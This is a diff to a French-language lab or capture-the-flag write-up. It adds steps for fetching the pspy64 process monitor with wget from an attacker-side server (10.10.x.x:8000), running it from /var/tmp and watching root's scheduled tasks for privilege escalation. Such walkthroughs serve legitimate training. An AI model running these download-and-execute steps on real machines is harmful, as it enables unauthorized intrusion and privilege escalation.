@@ -296,7 +296,14 @@ netstat -tulpn
 ### pspy64
 Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
 
-L’objectif est de repérer d’éventuelles tâches cron, scripts ou commandes exécutés automatiquement par root et qui pourraient être exploitables pour une escalade de privilèges.
+Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :
+
+cd /var/tmp
+wget http://10.10.x.x:8000/pspy64
+chmod +x pspy64
+./pspy64
+
+L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.
 
 Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
 
